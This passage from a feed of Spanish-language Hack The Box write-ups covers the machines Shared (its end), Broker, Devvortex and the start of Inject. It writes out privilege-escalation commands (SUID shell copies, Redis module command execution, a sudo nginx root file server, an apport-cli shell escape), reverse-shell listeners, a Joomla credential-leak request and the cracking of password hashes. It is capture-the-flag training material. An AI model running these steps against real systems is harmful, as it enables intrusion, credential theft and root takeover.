cmd=&quot;cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh&quot;

mkdir -m 777 &quot;$exploitdir/profile_default&quot;
mkdir -m 777 &quot;$exploitdir/profile_default/startup&quot;
echo &quot;__import__(&apos;os&apos;).popen(&apos;$cmd&apos;)&quot; &amp;gt; &quot;$exploitdir/profile_default/startup/x.py&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de ejecutar el script y esperar un minuto, nuestro shell SUID debería estar en &lt;code&gt;/tmp/dan_smith_sh{:.filepath}&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
/tmp/dan_smith_sh -p
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;La primera bandera se encuentra en &lt;code&gt;/home/dan_smith/user.txt{:.filepath}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Stabilizing Shell&lt;/h3&gt;
&lt;p&gt;Copiemos el contenido de &lt;code&gt;/home/dan_smith/.ssh/id_rsa{:.filepath}&lt;/code&gt; a la máquina atacante y utilicémoslo para iniciar sesión como &lt;code&gt;dan_smith&lt;/code&gt; a través de SSH para obtener una shell más estable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
chmod 600 dan_smith_id_rsa
ssh -i dan_smith_id_rsa &quot;dan_smith@$rhost&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al ejecutar el comando id, nos enteramos de que nuestro usuario actual forma parte del grupo sysadmin. Veamos a qué tiene acceso especial este grupo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
find / -group sysadmin 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;/usr/local/bin/redis_connector_dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se devuelve un archivo en &lt;code&gt;/usr/local/bin/redis_connector_dev{:.filepath}&lt;/code&gt;. Este archivo probablemente tiene algo que ver con una solución de almacenamiento de datos clave-valor conocida como Redis. Cuando ejecutamos &lt;code&gt;/usr/local/bin/redis_connector_dev{:.filepath}&lt;/code&gt;, imprime un mensaje de registro que dice «Logging to redis instance using password» y lo que parece la salida de la consulta INFO Server redis.&lt;/p&gt;
&lt;h3&gt;Redis&lt;/h3&gt;
&lt;p&gt;Recopilemos información básica sobre el archivo y veamos qué ocurre entre bastidores.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
file /usr/local/bin/redis_connector_dev|tr &apos;,&apos; &apos;\n&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Basándonos en la salida del comando file, podemos observar algunas cosas sobre el archivo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Es un ejecutable ELF x86-64&lt;/li&gt;
&lt;li&gt;se ha compilado con un compilador Go (de ahí el Go BuildID)&lt;/li&gt;
&lt;li&gt;No está despojado&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dado que el protocolo Redis RESP funciona en texto plano, podríamos capturar la contraseña. En primer lugar, copiemos el archivo en la máquina del atacante.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
scp -i dan_smith_id_rsa &quot;dan_smith@$rhost:/usr/local/bin/redis_connector_dev&quot; .
chmod +x redis_connector_dev
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutando el archivo en la máquina atacante, obtenemos un error quejándonos de que el puerto TCP 6379 está cerrado en la dirección loopback. Podemos abrir ese puerto ejecutando nc en una pestaña separada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@kali
nc -lv 127.0.0.1 6379
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora si ejecutamos ./redis_connector_dev{:.filepath} obtenemos alguna salida al listener.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Connection received on localhost 35468
*2
$4
auth
$16
[REDACTED]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Se pasan las cadenas auth y [REDACTED]. Dadas las circunstancias, la segunda cadena parece que puede ser la contraseña, así que vamos a intentar usarla con el comando redis-cli en la máquina de destino.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
redis-cli -a &quot;$password&quot; INFO server
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El comando de servidor INFO se ejecuta correctamente. Mientras ejecutamos algunos comandos de enumeración adicionales descubrimos que el almacén de redis está prácticamente vacío.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# dan_smith@shared.htb (SSH)
redis-cli -a &quot;$password&quot; INFO keyspace
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de algunas investigaciones sobre redis, nos encontramos con esta página que presenta diferentes métodos para lograr RCE en un servidor redis. Esto es útil para nosotros porque el usuario que ejecuta el servidor redis es root, lo que significa que ejecutaremos comandos como root si RCE es posible.&lt;/p&gt;
&lt;p&gt;Un método es cargar un archivo especial de objetos compartidos usando la consulta MODULE LOAD. Podemos construir el objeto compartido desde este código fuente en la máquina atacante, luego copiar &lt;code&gt;module.so{:.filepath}&lt;/code&gt; al objetivo.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# james_mason@shared.htb (SSH)
command=&quot;cp /bin/sh /root_sh;chmod a+xs /root_sh&quot;
redis-cli -a &quot;$password&quot; MODULE LOAD ~/module.so &amp;amp;&amp;amp;
	redis-cli -a &quot;$password&quot; system.exec &quot;$command&quot;
/root_sh -p
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ejecutar esto nos debe aterrizar un shell como root donde la última bandera se puede encontrar en &lt;code&gt;/root/root.txt{:.filepath}&lt;/code&gt;&lt;/p&gt;
</content:encoded></item><item><title>Broker HTB Writeup</title><link>https://fuwari.vercel.app/posts/broker/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/broker/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Broker es una máquina Linux de fácil dificultad que aloja una versión de Apache ActiveMQ. La enumeración de la versión de Apache ActiveMQ muestra que es vulnerable a la ejecución remota de código sin autenticación, que se aprovecha para obtener acceso de usuario en el objetivo. La enumeración posterior a la explotación revela que el sistema tiene una configuración errónea de sudo que permite al usuario activemq ejecutar sudo /usr/sbin/nginx, que es similar a la reciente divulgación de Zimbra y se aprovecha para obtener acceso de root.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; ping -c 1 10.10.11.243   
PING 10.10.11.243 (10.10.11.243) 56(84) bytes of data.
64 bytes from 10.10.11.243: icmp_seq=1 ttl=63 time=139 ms

--- 10.10.11.243 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.019/139.019/139.019/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;comenzamos nuestro escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap -sC -sV -oA broker 10.10.11.243

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:754a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;En nuestro resultado podemos ver 2 puertos.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH&lt;/td&gt;
&lt;td&gt;8.9p1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;nginx&lt;/td&gt;
&lt;td&gt;1.18.0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Por ahora no intentamos nada a través de ssh ya que no tenemos credenciales válidas, Así que vamos a ver el sitio web.&lt;/p&gt;
&lt;h3&gt;Login&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./img/login.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;En cuanto entré en la web me pidió credenciales, probé admin:admin y por arte de magia me dejó entrar.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/web.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Tenemos un sitio web con &lt;code&gt;activeMQ&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;¿Qué es activemq? Apache ActiveMQ es un broker de mensajes de código abierto escrito en Java junto con un completo cliente Java Message Service. Proporciona «Enterprise Features», que en este caso significa fomentar la comunicación desde más de un cliente o servidor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Si vamos a la sección que dice Manage ActiveMQ broker podemos ver más información.&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;CVE-2023-46604 Exploit&lt;/h3&gt;
&lt;p&gt;Hemos buscado el exploit CVE de ActiveMQ 5.15.15 y hemos encontrado un exploit interesante:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/evkl1d/CVE-2023-46604&quot;&gt;CVE-2023-46604&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;clonamos este exploit:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; git clone https://github.com/evkl1d/CVE-2023-46604
&amp;gt; cd CVE-2023-46604
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Escuchamos en el puerto 6666:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 6666
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y editamos el poc.xml que contiene la carpeta exploit que clonamos. La línea que vas a editar necesita tu IP de la interfaz tun0 y el puerto en el que estás escuchando, para recibir la shell allí.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/xml.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Creamos un servidor en python en el que el exploit tomará el poc.xml para atacar la web.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/py.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el exploit de la siguiente manera:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; python3 exploit.py -i 10.10.11.243 -u &apos;http://10.10.14.26/poc.xml&apos; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;En el parámetro -u ponemos el Servidor Python que hicimos anteriormente.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;¿Entendiste lo que hice? Te explico Básicamente, copiamos un exploit de github, que está dedicado para esta Vulnerabilidad de activeMQ.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;en la guía de uso del exploit, nos dice que tenemos que crear un servidor python que le asignaremos cuando ejecutemos el ataque, para que cargue el fichero poc.xml en la página con nuestra IP y puerto en el que ya estamos escuchando para recibir nuestro Revshell.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;./img/nc.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation &amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Si ponemos el comando &lt;code&gt;sudo -l&lt;/code&gt; nos muestra esto:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Nginx Sudo - Read root flag&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo -l se utiliza para comprobar los privilegios que tiene un usuario en un sistema Unix o Linux a través del comando sudo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Bien, Podemos ejecutar nginx con privilegios sudo sin una contraseña, Vamos a buscar profundamente cómo podemos hacer eso.&lt;/p&gt;
&lt;p&gt;Después de la búsqueda, Ahora quiero crear un archivo de configuración, pero primero tenemos que ver nginx.conf de esta ruta /etc/nginx/nginx.conf.&lt;/p&gt;
&lt;p&gt;Voy a editar este archivo desde mi máquina y subir en la caja.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user root;
worker_processes auto;
events {
       worker_connections 790;
}
http{
      server {
             listen   9000;
             location / {
                      root /;
             }
      
      }

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Para establecer el archivo de configuración utilice este comando.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nginx -c /tmp/nginx1.conf
&amp;gt; ss -ltnp # displays TCP connections with a source port
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora podemos acceder a la bandera raíz.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl http://localhost:9000/root/root.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Gracias por leer.&lt;/p&gt;
</content:encoded></item><item><title>Devvortex HTB Writeup</title><link>https://fuwari.vercel.app/posts/devvortex/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/devvortex/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comenzamos nuestro escaneo con nmap:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo nmap 10.10.11.242 -sS --open --min-rate 3000 -p- -n -Pn -oN Nmapscan

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; nmap -p22,80 -sVC 10.10.11.242 -Pn -oN versionScan

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sólo tenemos 2 puertos abiertos, así que echemos un vistazo a la página web&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Después de buscar en toda la web, fuzz subdominios:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt

Found: dev.devvortex.htb (Status: 200) [Size: 23221
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;encontramos otra página web:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Viendo las tecnologías de la web, intentamos hacer fuzzing para encontrar el panel de login de joomla.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt

/robots.txt           (Status: 200) [Size: 764]
/README.txt           (Status: 200) [Size: 764]
/administrator        (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/api/]          
/api/experiments      (Status: 406) [Size: 29]                                               
/api/experiments/configurations (Status: 406) [Size: 29]                                     
/cache                (Status: 301) [Size: 178] [--&amp;gt; http://dev.devvortex.htb/cache/]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;en el README.txt vemos lo siguiente:&lt;/p&gt;
&lt;p&gt;http://dev.devvortex.htb/README.txt&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Esta es la versión, busquemos vulnerabilidades o exploits.&lt;/p&gt;
&lt;p&gt;Busca: Joomla 4.2 exploit&lt;/p&gt;
&lt;h3&gt;CVE-2023-23752 - Exploit&lt;/h3&gt;
&lt;p&gt;Encontramos un exploit:
&lt;a href=&quot;https://www.exploit-db.com/exploits/51334&quot;&gt;Exploit DB - CVE-2023-23752 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Descargamos el exploit e instalamos las librerías necesarias&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; sudo gem install docopt httpx json paint
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Al ejecutar el exploit tenemos los siguientes resultados:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby exploit.rb http://dev.devvortex.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;CVE-2023-23752 - Manual&lt;/h3&gt;
&lt;p&gt;Ejecutaremos la misma vulnerabilidad, pero manualmente, para entenderlo mejor:&lt;/p&gt;
&lt;p&gt;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -s &apos;http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&apos; | ./jq-linux-amd64 | grep -E &apos;user|password&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;También encontramos información que podría sernos útil en el mismo archivo&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;CVE-2023-23752 - My Script&lt;/h3&gt;
&lt;p&gt;También he creado un script para esto, así que tienes más opciones: https://github.com/mil4ne/CVE-2023-23752-Joomla-v4.2.8/&lt;/p&gt;
&lt;p&gt;Con estas credenciales intentamos entrar en el panel de Joomla.&lt;/p&gt;
&lt;h3&gt;Get shell&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;una vez dentro, vamos a la sección system.&lt;/p&gt;
&lt;p&gt;Ahora solo tenemos que editar uno de los archivos de la web o del panel y ponerles php revshell, usaremos este:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Accedemos al fichero que hemos editado, para recibir el shell a nuestro puerto de escucha&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -nlvp 9001              
listening on [any] 9001 ...
connect to [10.10.14.145] from (UNKNOWN) [10.10.11.242] 41690
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 15:47:51 up  4:52,  0 users,  load average: 0.57, 0.34, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can&apos;t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Lateral Movement&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;h3&gt;Mysql Database&lt;/h3&gt;
&lt;p&gt;Previamente habíamos visto que existía una base de datos mysql, así que intentamos conectarnos:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; mysql -u lewis -p 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;show databases;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;use joomla;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;show tables;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;select * from sd4fg_users
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Después de mirar todo el contenido de la base de datos, encontramos el siguiente hash del usuario logan:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Crack Hash&lt;/h3&gt;
&lt;p&gt;Identificamos el hash y crackeamos con john&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;pasamos al usuario logan&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; su logan
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;logan@devvortex:~$ sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;CVE-2023–1326 - Privilege Escalation - apport-cli 2.26.0&lt;/h3&gt;
&lt;p&gt;En esta parte voy a mostrarte 2 formas de escalar privilegios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;apport-cli Escalada de Privilegios&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;creamos un archivo sh y lo ejecutamos con el apport-cli&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;logan@devvortex:/tmp$ echo &apos;Hello apport-cli&apos; &amp;gt; exp.sh
logan@devvortex:/tmp$ chmod +x exp.sh
logan@devvortex:/tmp$ sudo apport-cli -c exp.sh less
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seleccionamos V para la opción de ver informe y cuando diga &apos;:&apos;, insertamos el shell !/bin/bash&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;What would you like to do? Your options are:
  S: Send report (1.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
&amp;lt;HERE YOU GET &quot;less&quot; command output type &quot;!/bin/bash&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Inject HTB Writeup</title><link>https://fuwari.vercel.app/posts/inject/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/inject/</guid><description>Easy Machine</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Inject es una máquina Linux fácil creada por rajHere en Hack The Box que consiste en explotar un bug de Directory Traversal para localizar y leer archivos locales como frank. Usamos esta vulnerabilidad para enumerar las versiones de software involucradas en el servidor web, donde encontramos una instalación desactualizada de Spring Framework que es vulnerable a un bug crítico rastreado como CVE-2022-22963. Este fallo se utiliza entonces para obtener la ejecución de código como frank, y encontrar credenciales para phil en el directorio home de frank. El usuario phil tiene permiso para escribir playbooks de Ansible en un determinado directorio que es utilizado por root en trabajos CRON programados. Con un playbook especial, somos capaces de ejecutar código como root y obtener la bandera del sistema&lt;/p&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Initial Recon&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Vamos a configurar nuestro entorno y ejecutar un escaneo de puertos TCP con esta envoltura nmap personalizada.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# mhil4ne@Kali (bash)
rhost=&quot;10.10.11.204&quot; # Target IP address
lhost=&quot;10.10.14.4&quot; # Your VPN IP address
echo rhost=$rhost &amp;gt;&amp;gt; .env
echo lhost=$lhost &amp;gt;&amp;gt; .env
. ./.env &amp;amp;&amp;amp; ctfscan $rhost

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The open ports reported in the scan include:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Product&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH&lt;/td&gt;
&lt;td&gt;8.9p1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;HTTP&lt;/td&gt;
&lt;td&gt;Nagios NSCA&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Web&amp;lt;/span&amp;gt;&lt;/h2&gt;
&lt;p&gt;Comenzaremos explorando el servidor HTTP en el puerto 8080 ya que los servicios web suelen ser vulnerables. También vamos a enrutar nuestras peticiones a través de nuestro proxy local BurpSuite o simplemente utilizar el navegador incorporado de BurpSuite.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La página de inicio presenta algunas características, incluida la posibilidad de subir archivos. Vamos a echar un vistazo a esa página, ya que la carga de archivos es un terreno resbaladizo en lo que respecta a la seguridad.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Intentaremos subir un archivo en nuestra sesión de navegador mientras capturamos la petición con BurpSuite.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /upload HTTP/1.1
Host: 10.10.11.204:8080
Content-Length: 220
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAPgIHu4nfmqDyyE2
User-Agent: BurpSuite
Accept: */*

------WebKitFormBoundaryAPgIHu4nfmqDyyE2
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;demo.txt&quot;
Content-Type: text/plain

This is a standard UTF-8 text file...

------WebKitFormBoundaryAPgIHu4nfmqDyyE2--

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La respuesta indica que el formulario acepta exclusivamente archivos de imagen, así que intentaremos subir una imagen.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;p&gt;La carga se ha realizado correctamente y podemos ver la imagen dinámicamente en el punto final /show_image.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;File Disclosure&lt;/h3&gt;
